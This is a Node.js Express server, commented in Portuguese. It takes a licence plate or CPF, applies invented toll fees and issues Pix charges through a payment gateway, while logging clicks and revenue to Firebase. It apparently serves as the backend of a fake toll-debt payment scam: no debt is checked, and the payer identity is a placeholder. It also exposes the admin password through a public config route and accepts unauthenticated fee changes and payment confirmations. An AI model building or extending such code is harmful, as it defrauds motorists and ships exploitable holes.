import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import QRCode from 'qrcode';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve a pasta de arquivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// Rota do Admin
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Helper para chamadas ao Firebase Realtime Database
const getDbUrl = () => (process.env.FIREBASE_DATABASE_URL || '').replace(/\/$/, '');

async function updateFirebaseNode(endpoint, data, method = 'PATCH') {
    const dbUrl = getDbUrl();
    if (!dbUrl) return null;
    try {
        const res = await fetch(`${dbUrl}/${endpoint}.json`, {
            method,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        return await res.json();
    } catch (err) {
        console.error(`Erro ao atualizar Firebase (${endpoint}):`, err.message);
        return null;
    }
}

async function getFirebaseNode(endpoint) {
    const dbUrl = getDbUrl();
    if (!dbUrl) return null;
    try {
        const res = await fetch(`${dbUrl}/${endpoint}.json`);
        return await res.json();
    } catch (err) {
        return null;
    }
}

// 1. ROTA DE CONFIGURAÇÕES PÚBLICAS
app.get('/api/config', (req, res) => {
    res.json({
        firebase: {
            apiKey: process.env.FIREBASE_API_KEY || '',
            authDomain: process.env.FIREBASE_AUTH_DOMAIN || '',
            databaseURL: process.env.FIREBASE_DATABASE_URL || '',
            projectId: process.env.FIREBASE_PROJECT_ID || '',
            storageBucket: process.env.FIREBASE_STORAGE_BUCKET || '',
            messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID || '',
            appId: process.env.FIREBASE_APP_ID || ''
        },
        admin: {
            user: process.env.ADMIN_USER || 'admin',
            pass: process.env.ADMIN_PASS || '123456'
        }
    });
});

// 2. ROTA PARA REGISTRAR ACESSO À TELA
app.post(['/api/registrar-acesso', '/api/acesso'], async (req, res) => {
    try {
        const stats = (await getFirebaseNode('stats')) || {};
        const acessosAtuais = Number(stats.acessos || stats.acessos_tela || 0) + 1;
        
        await updateFirebaseNode('stats', { acessos: acessosAtuais, acessos_tela: acessosAtuais });
        await updateFirebaseNode('metricas', { acessos: acessosAtuais, views: acessosAtuais });

        return res.json({ status: true, acessos: acessosAtuais });
    } catch (err) {
        return res.json({ status: false });
    }
});

// 3. ROTA PARA REGISTRAR CONSULTA DE PLACA/CPF (Garante salvamento no Firebase)
app.post('/api/registrar-consulta', async (req, res) => {
    try {
        const { placa, valor, tipo_busca } = req.body || {};
        if (!placa) return res.status(400).json({ status: false, error: 'Placa/CPF obrigatório' });

        const chaveLimpa = String(placa).replace(/[^A-Z0-9]/g, '').toUpperCase();
        const dataAgoraIso = new Date().toISOString();
        const dataAgoraFmt = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

        const dadosVeiculo = {
            placa: chaveLimpa,
            valor: Number(valor || 33.90),
            status: 'pendente',
            tipo_busca: tipo_busca || (chaveLimpa.length === 11 ? 'cpf' : 'placa'),
            data_consulta: dataAgoraIso,
            criado_em: dataAgoraFmt,
            data: dataAgoraFmt
        };

        await updateFirebaseNode(`veiculos/${chaveLimpa}`, dadosVeiculo);
        await updateFirebaseNode(`transacoes/${chaveLimpa}`, dadosVeiculo);

        return res.json({ status: true, data: dadosVeiculo });
    } catch (err) {
        return res.status(500).json({ status: false, error: err.message });
    }
});

// 4. ROTA PARA GERAR PIX (PayShark + Registro no Admin/Firebase)
app.post(['/api/gerar-pix', '/gerar-pix', '/api/gerar_pix.php', '/gerar_pix.php'], async (req, res) => {
    try {
        const dadosEntrada = req.body || {};

        let valorReais = 10.00;
        if (dadosEntrada.valor) {
            valorReais = parseFloat(String(dadosEntrada.valor).replace(',', '.'));
        }
        const amountCents = Math.round(valorReais * 100);

        const apiKey = (process.env.PAYSHARK_API_KEY || process.env.PIX_GATEWAY_PUBLIC_KEY || '').trim();
        const apiSecret = (process.env.PAYSHARK_API_SECRET || process.env.PIX_GATEWAY_SECRET_KEY || '').trim();

        if (!apiKey || !apiSecret) {
            return res.status(500).json({ status: false, error: "Credenciais da PayShark não configuradas." });
        }

        const urlBase = (process.env.PAYSHARK_API_URL || 'https://api.paysharkgateway.com.br').replace(/\/$/, '');
        const endpoint = `${urlBase}/v1/transactions`;
        const authHeader = `Basic ${Buffer.from(`${apiKey}:${apiSecret}`).toString('base64')}`;

        const doc = String(process.env.PIX_GATEWAY_CLIENT_DOCUMENT || '01387220055').replace(/\D/g, '');
        const phone = String(process.env.PIX_GATEWAY_CLIENT_PHONE || '11999999999').replace(/\D/g, '');
        const email = String(process.env.PIX_GATEWAY_CLIENT_EMAIL || 'teste@teste.com').trim();
        const placa = String(dadosEntrada.placa || 'CONSULTA').replace(/[^A-Z0-9]/g, '').toUpperCase();
        const name = process.env.PIX_GATEWAY_CLIENT_NAME || (placa ? `Pedágio ${placa}` : 'Cliente Pedágio');
        const postbackUrl = process.env.PIX_GATEWAY_CALLBACK_URL || '';

        const payload = {
            amount: amountCents,
            currency: 'BRL',
            paymentMethod: 'pix',
            customer: {
                name: name,
                email: email,
                phone: phone,
                document: {
                    number: doc,
                    type: doc.length > 11 ? 'cnpj' : 'cpf'
                }
            },
            items: [
                {
                    title: placa ? `Pedágio - ${placa}` : 'Regularização de Débito',
                    unitPrice: amountCents,
                    quantity: 1,
                    tangible: false
                }
            ],
            externalRef: `pd-${placa || 'consulta'}-${Date.now()}`
        };

        if (postbackUrl && !postbackUrl.includes('seu-app.onrender.com')) {
            payload.postbackUrl = postbackUrl;
        }

        const response = await fetch(endpoint, {
            method: 'POST',
            headers: {
                'Authorization': authHeader,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const textResponse = await response.text();
        let resData = {};
        try {
            resData = textResponse ? JSON.parse(textResponse) : {};
        } catch (e) {
            return res.status(500).json({ status: false, error: "Erro ao comunicar com a gateway." });
        }

        const tx = resData.data || resData;
        const pixInfo = tx.pix || {};
        const copiaCola = pixInfo.qrcode || pixInfo.qrCode || pixInfo.copyPaste || tx.copy_paste || '';

        if (copiaCola) {
            let qrcodeBase64 = '';
            try {
                const dataUrl = await QRCode.toDataURL(copiaCola, { margin: 1, width: 280 });
                qrcodeBase64 = dataUrl.replace(/^data:image\/[^;]+;base64,/, '');
            } catch (qrErr) {}

            const dataAgoraIso = new Date().toISOString();
            const dataAgoraFmt = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

            // Salva a transação como PENDENTE no Firebase com todos os campos unificados
            const dadosTransacao = {
                placa: placa,
                cpf: doc,
                tipo: 'Pix',
                tipo_busca: dadosEntrada.modelo_carro ? (dadosEntrada.modelo_carro.includes('CPF') ? 'cpf' : 'placa') : 'placa',
                valor: valorReais,
                valor_formatado: `R$ ${valorReais.toFixed(2).replace('.', ',')}`,
                status: 'pendente',
                criado_em: dataAgoraFmt,
                data: dataAgoraFmt,
                data_consulta: dataAgoraIso,
                txid: tx.id || payload.externalRef
            };

            await updateFirebaseNode(`veiculos/${placa}`, dadosTransacao);
            await updateFirebaseNode(`transacoes/${placa}`, dadosTransacao);

            // Incrementa o contador "Cliques no Pix" no Firebase
            const stats = (await getFirebaseNode('stats')) || {};
            const cliquesAtuais = Number(stats.cliques_pix || stats.cliques || stats.clicks || 0) + 1;
            await updateFirebaseNode('stats', { cliques_pix: cliquesAtuais, cliques: cliquesAtuais });
            await updateFirebaseNode('metricas', { cliques_pix: cliquesAtuais, clicks: cliquesAtuais });

            return res.json({
                status: true,
                success: true,
                copy_paste: copiaCola,
                copia_cola: copiaCola,
                copiaecola: copiaCola,
                qrcode: copiaCola,
                qr_code: copiaCola,
                qrcode_base64: qrcodeBase64,
                qr_code_base64: qrcodeBase64,
                qr_code_url: pixInfo.qrCodeUrl || `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copiaCola)}`,
                paymentData: { copiaecola: copiaCola, qrcode: copiaCola, qrcode_base64: qrcodeBase64 },
                data: { copy_paste: copiaCola, qrcode: copiaCola, qrcode_base64: qrcodeBase64 }
            });
        } else {
            return res.json({
                status: false,
                error: resData.message || tx.message || 'Falha ao obter QR Code da PayShark'
            });
        }

    } catch (error) {
        return res.status(500).json({ status: false, error: "Erro interno no servidor: " + error.message });
    }
});

// 5. ROTA PARA TAXAS DO SISTEMA
app.get('/api/taxas', async (req, res) => {
    const taxas = (await getFirebaseNode('configuracoes/taxas')) || (await getFirebaseNode('taxas')) || {
        base: 14.50,
        fine: 15.00,
        interest: 4.40,
        tarifa_base: 14.50,
        multa_adm: 15.00,
        juros_mora: 4.40
    };
    return res.json(taxas);
});

app.post('/api/taxas', async (req, res) => {
    const novasTaxas = req.body || {};
    await updateFirebaseNode('configuracoes/taxas', novasTaxas, 'PATCH');
    await updateFirebaseNode('taxas', novasTaxas, 'PATCH');
    return res.json({ status: true, message: "Taxas atualizadas com sucesso" });
});

// 6. ROTA DE WEBHOOK
app.post('/api/webhook', async (req, res) => {
    try {
        const dados = req.body;
        console.log('LOG WEBHOOK:', JSON.stringify(dados));

        if (!dados) return res.status(400).send("Payload inválido");

        const status = dados.status ? String(dados.status).trim().toUpperCase() : '';

        if (status === 'COMPLETED' || status === 'PAID' || status === 'PAGO' || status === 'APPROVED') {
            let descricao = dados.description || (dados.items && dados.items[0] ? dados.items[0].title : '');
            if (!descricao && dados.body && dados.body.description) {
                descricao = dados.body.description;
            }

            let identificador = '';
            if (descricao) {
                const partes = descricao.split('-');
                identificador = partes[partes.length - 1].trim();
            }

            const chaveLimpa = identificador.replace(/[^A-Z0-9]/g, '').toUpperCase();

            if (chaveLimpa && chaveLimpa.length >= 7) {
                const dataAgora = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

                await updateFirebaseNode(`veiculos/${chaveLimpa}`, { status: "pago", pago_em: dataAgora });
                await updateFirebaseNode(`transacoes/${chaveLimpa}`, { status: "pago", pago_em: dataAgora });

                const valorPago = Number(dados.amount || dados.paidAmount || 0) / (dados.amount > 1000 ? 100 : 1);
                const stats = (await getFirebaseNode('stats')) || {};
                const faturamentoAtual = Number(stats.faturamento || 0) + (valorPago || 0);

                await updateFirebaseNode('stats', { faturamento: faturamentoAtual });
                await updateFirebaseNode('metricas', { faturamento: faturamentoAtual });

                return res.status(200).send(`Firebase e Admin atualizados para a placa: ${chaveLimpa}`);
            }
        }

        return res.status(200).send("Webhook processado.");
    } catch (err) {
        return res.status(500).send("Erro interno no webhook");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor executando na porta ${PORT}`);
});